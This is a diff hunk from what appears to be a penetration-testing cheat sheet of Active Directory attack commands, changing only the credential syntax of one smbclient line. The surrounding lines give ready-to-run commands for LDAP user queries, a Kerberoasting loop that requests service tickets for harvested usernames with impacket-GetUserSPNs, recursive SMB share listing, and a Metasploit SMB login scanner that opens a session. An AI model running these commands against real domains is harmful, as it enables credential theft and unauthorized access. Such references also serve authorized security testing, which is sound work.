@@ -381,7 +381,7 @@ nxc ldap $TARGET -u '$USERNAME' -p '$PASSWORD' --query "(SAMAccountType=80530636
 while IFS= read -r user; do echo "\n*-------------------*\n$user"; impacket-GetUserSPNs $DOM/ -dc-ip $TARGET -request-user '$user' -k -no-pass; done < usernames
 
 [*] (445) SMB
-smbclient -L //$TARGET -U '$USERNAME' -P '$PASSWORD' 2>/dev/null | awk '/-----/{f=1;next} f {print $1}' | awk '{print "use " $1 "\ntree\n\n"}' > tee smbcommands; impacket-smbclient /'$USERNAME':'$PASSWORD'@$TARGET -inputfile smbcommands | grep -vE '[-]|# tree' | sed 's/^[ \t]*//' | tee smbfiles
+smbclient -L //$TARGET -U '$USERNAME'%'$PASSWORD' 2>/dev/null | awk '/-----/{f=1;next} f {print $1}' | awk '{print "use " $1 "\ntree\n\n"}' > tee smbcommands; impacket-smbclient /'$USERNAME':'$PASSWORD'@$TARGET -inputfile smbcommands | grep -vE '[-]|# tree' | sed 's/^[ \t]*//' | tee smbfiles
 
 msfconsole -q -x "use auxiliary/scanner/smb/smb_login; set RHOSTS $TARGET; set SMBUser $USERNAME; set SMBPass $PASSWORD; set BLANK_PASSWORDS true; set CreateSession true; run"
 sessions -i 1
